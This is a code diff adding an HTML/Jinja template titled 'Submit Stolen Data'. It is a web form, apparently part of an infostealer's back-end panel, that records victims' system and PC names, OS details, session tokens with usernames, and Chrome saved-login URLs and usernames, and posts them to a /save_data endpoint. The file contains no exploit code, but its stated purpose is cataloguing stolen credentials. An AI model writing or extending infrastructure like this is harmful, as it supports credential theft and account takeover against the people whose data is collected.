@@ -1,0 +1,56 @@
+{% extends "base.html" %}
+
+{% block content %}
+<h1>Submit Stolen Data</h1>
+
+<form id="dataForm" method="POST" action="/save_data">
+    <div>
+        <label>System Name:</label>
+        <input type="text" name="system_name" required>
+    </div>
+
+    <div>
+        <label>PC Name:</label>
+        <input type="text" name="pc_name" required>
+    </div>
+
+    <div>
+        <label>OS Info:</label>
+        <input type="text" name="os_info" required>
+    </div>
+
+    <h3>Tokens</h3>
+    <div id="tokens">
+        <div class="token">
+            <input type="text" name="tokens[0][token]" placeholder="Token" required>
+            <input type="text" name="tokens[0][username]" placeholder="Username">
+        </div>
+    </div>
+    <button type="button" onclick="addToken()">Add Token</button>
+
+    <h3>Browser Data</h3>
+    <div id="browserData">
+        <div class="browser">
+            <input type="text" name="browser_data[Chrome][logins][0][url]" placeholder="URL">
+            <input type="text" name="browser_data[Chrome][logins][0][username]" placeholder="Username">
+        </div>
+    </div>
+
+    <button type="submit">Submit</button>
+</form>
+
+<script>
+function addToken() {
+    const div = document.getElementById('tokens');
+    const count = div.children.length;
+    const newToken = document.createElement('div');
+    newToken.className = 'token';
+    newToken.innerHTML = `
+        <input type="text" name="tokens[${count}][token]" placeholder="Token" required>
+        <input type="text" name="tokens[${count}][username]" placeholder="Username">
+    `;
+    div.appendChild(newToken);
+}
+</script>
+
+{% endblock %}
